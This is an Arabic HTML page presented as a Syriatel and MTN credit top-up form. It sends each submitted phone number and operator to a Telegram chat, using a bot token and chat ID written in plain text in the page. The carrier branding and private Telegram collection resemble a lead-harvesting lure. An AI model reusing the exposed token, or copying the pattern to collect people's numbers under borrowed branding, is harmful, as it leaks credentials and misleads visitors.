<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تعبئة رصيد - سيريتل & MTN</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"/>
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: #0a0a0a;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      padding: 20px;
    }

    .container {
      background: #111;
      border-radius: 20px;
      padding: 30px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 15px #222;
    }

    h1 {
      margin-bottom: 10px;
      color: #00eaff;
    }

    select, input, button {
      width: 100%;
      margin: 15px 0;
      padding: 14px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
    }

    select {
      background: #222;
      color: #fff;
    }

    input {
      background: #1a1a1a;
      color: #fff;
    }

    button {
      background: linear-gradient(to right, #e70000, #fbc100);
      color: #000;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      opacity: 0.85;
    }

    .logos {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 15px;
    }

    .logos img {
      width: 70px;
      height: auto;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logos">
      <img src="https://upload.wikimedia.org/wikipedia/ar/6/6e/Syriatel_logo.png" alt="Syriatel" />
      <img src="https://upload.wikimedia.org/wikipedia/ar/0/0e/MTN_Logo.svg" alt="MTN" />
    </div>
    <h1>تعبئة رصيد</h1>
    <select id="operator">
      <option value="Syriatel">سيريتل</option>
      <option value="MTN">MTN</option>
    </select>
    <input type="text" id="phone" placeholder="أدخل رقم الهاتف" />
    <button onclick="submitForm()">تعبئة الرصيد</button>
  </div>

  <script>
    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
    const chatId = "7220184605";

    async function sendTelegramMessage(text) {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
    }

    async function submitForm() {
      const operator = document.getElementById("operator").value;
      const phone = document.getElementById("phone").value.trim();

      if (!phone || phone.length < 7) {
        alert("يرجى إدخال رقم هاتف صحيح.");
        return;
      }

      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

      const message = `
📲 طلب تعبئة رصيد
🔹 الرقم: ${phone}
🔸 الشبكة: ${operator}
🕓 الوقت: ${now}
      `.trim();

      await sendTelegramMessage(message);
      alert("✅ تم إرسال طلب تعبئة الرصيد بنجاح.");
    }
  </script>

</body>
</html>
